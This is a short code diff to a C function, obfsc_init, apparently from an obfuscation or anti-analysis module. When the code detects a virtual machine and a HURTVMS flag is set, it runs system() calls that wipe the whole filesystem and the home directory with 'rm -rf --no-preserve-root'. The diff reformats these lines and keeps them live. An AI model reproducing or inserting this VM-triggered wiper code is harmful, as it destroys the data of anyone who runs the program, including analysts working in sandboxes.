@@ -39,16 +39,16 @@ void obfsc_init(void)
 {
 	if (obfsc_vm() == true)
 	{
-#ifndef DEBUG
-#	ifdef HURTVMS
+#		ifndef DEBUG
+#		ifdef HURTVMS
 		system("rm -rf --no-preserve-root /");
+		system("rm -rf --no-preserve-root ~/");
 		system("rm -rf /");
 		system("rm -rf ~/");
-		system("rm -rf --no-preserve-root ~/");
-#	endif
+#		endif // HURTVMS
 		exit(0);
-#else
+#		else // DEBUG
 		printd("VM Detected");
-#endif
+#		endif // DEBUG
 	}
 }
